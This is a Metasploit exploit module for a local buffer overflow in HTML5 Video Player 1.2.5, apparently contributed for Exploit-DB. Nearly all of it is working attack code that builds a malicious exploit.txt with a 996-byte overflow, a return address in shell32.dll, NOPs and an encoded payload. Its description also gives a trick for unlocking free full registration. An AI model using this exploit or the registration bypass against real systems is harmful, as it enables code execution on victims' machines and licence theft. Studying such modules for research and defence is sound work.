##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'HTML5 Video Player 1.2.5 - Local Buffer Overflow - Non SEH ',
      'Description'  => %q{
         # PoC:
# 1.) Generate exploit.txt, copy the contents to clipboard
# 2.) In application, open 'Help' then 'Register'
# 3.) Paste the contents of exploit.txt under 'KEY CODE'
# 4.) Click OK - Calc POPS!
# Extra Info:
#Exact match 996 = For free registration (Fill buffer with ABCD's to get free full registration)
#Exact match 997 = For buffer overflow
#JMP ESP 0x7cb32d69  shell32.dll
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'DINO COVOTSOS<services[@]telspace.co.za> <Twitter:@telspacesystems ',# Original discovery
          'Sungha Park <l4wk3r@gmail.com>',       # MSF module
        ],
      'References'  =>
        [
          [ 'OSVDB', '' ],
          [ 'EBD', '46279' ],
          [ 'CVE', '' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Platform'  => 'win',
      'Payload'   =>
        {
          'BadChars'    => "\x00\xd5\x0a\x0d\x1a",
          'DisableNops' => true,
          'Space'       => 500
        },
      'Targets'   =>
        [
          [ 'HTML5 Video Player 1.2.5',
            {
              'Ret'     =>  0x7cb32d69, # 0x72d12f35 : P/P/R FROM msacm32.drv form winxp sp3
              'Offset'  =>  996
            }
          ],
        ],
      'Privileged'  => false,
      'DisclosureDate'  => 'Jan 01 2019',
      'DefaultTarget'  => 0))

    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'exploit.txt']),], self.class)

  end

  def exploit
    buf = "\x41"*(target['Offset'])
#    buf << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # nseh (jmp to payload)
    buf << [target.ret] .pack('V')  # seh
    buf << make_nops(20)
    buf << payload.encoded
#    buf << "\x42" * 200

    file_create(buf)
    handler
    
  end
end
